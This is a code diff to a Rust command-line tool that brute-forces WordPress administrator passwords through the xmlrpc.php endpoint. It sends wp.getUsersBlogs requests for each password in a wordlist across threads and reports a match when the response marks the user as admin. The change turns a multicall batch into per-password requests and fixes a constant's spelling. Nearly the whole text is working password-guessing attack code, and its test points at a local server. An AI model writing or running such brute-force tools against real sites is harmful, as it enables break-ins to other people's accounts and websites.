@@ -5,12 +5,12 @@ use std::thread::{self};
 use url::Url;
 
 use clap::{AppSettings, Parser};
-use xmlrpc::{Request, Value};
+use xmlrpc::Request;
 
 mod errors;
 use errors::Error;
 
-const DEAFULT_THREADS_NUM: u8 = 5;
+const DEFAULT_THREADS_NUM: u8 = 5;
 
 // Arguments definition
 #[derive(Parser, Debug, Clone)]
@@ -64,33 +64,36 @@ fn read_dictionary(dictionary_arg: &str) -> Result<Vec<String>, Error> {
 }
 
 /// This function performs the real attack to the target host
-fn attack(username: &str, dict_chunk: &[String], url: &str) -> Result<(), Error> {
+fn attack(username: &str, dict_chunk: &[String], url: &str) {
     // For each password in the chunk we create a request and then perform the multicall
-    let req_list: Vec<Request> = dict_chunk
-        .into_iter()
-        .map(|password| {
-            // Here is an example of calling wp.getUsersBlog but it can be any method exposed by the API
-            Request::new("wp.getUsersBlogs")
-                .arg(username)
-                .arg(password.as_str())
-        })
-        .collect();
+    for password in dict_chunk {
+        // Here is an example of calling wp.getUsersBlog but it can be any method exposed by the API
+        let req = Request::new("wp.getUsersBlogs")
+            .arg(username)
+            .arg(password.as_str());
 
-    let req = xmlrpc::Request::new_multicall(&req_list);
-
-    let res = req
-        .call_url(url)
-        .map_err(|e| Error::UnableToPerformRequest(e))?;
-    
-    println!("RES: {:?}", res);
-    if let Some(res_val) = res.as_array() {
-        res_val.into_iter().for_each(|v| {
-            if let Value::Struct(s) = v {
-                println!("struct: {:?}", s);
+        if let Ok(res) = req.call_url(url) {
+            if let Some(res) = res.as_array() {
+                // We have some result
+                for v in res {
+                    if let Some(data_struct) = v.as_struct() {
+                        // Check the hit
+                        if let Some(admin_info) = data_struct.get("isAdmin") {
+                            if admin_info.as_bool() == Some(true) {
+                                println!(
+                                    "Found match: username='{}', password='{}'",
+                                    username, password
+                                );
+                                return;
+                            }
+                        }
+                    }
+                }
             }
-        });
+        }
     }
-    Ok(())
+
+    println!("No match found.");
 }
 
 pub fn main() {
@@ -103,7 +106,7 @@ pub fn main() {
         let mut threads = vec![];
 
         wordlist
-            .chunks(args.threads_num.unwrap_or(DEAFULT_THREADS_NUM).into())
+            .chunks(args.threads_num.unwrap_or(DEFAULT_THREADS_NUM).into())
             .for_each(|dict_chunk| {
                 threads.push(s.spawn(|| attack(&args.username, dict_chunk, &args.xml_url)));
             });
@@ -118,13 +121,17 @@ pub fn main() {
 mod tests {
     use crate::attack;
 
-
     #[test]
     fn test_attack() {
         let username = "admin";
         let url = "http://127.0.0.1:8080/xmlrpc.php";
         let dict_chunk = &[
-            "administrator".to_owned()
+            "test".to_owned(),
+            "test".to_owned(),
+            "test".to_owned(),
+            "administrator".to_owned(),
+            "test".to_owned(),
+            "test".to_owned(),
         ];
 
         println!("Test: {:?}", attack(username, dict_chunk, url));
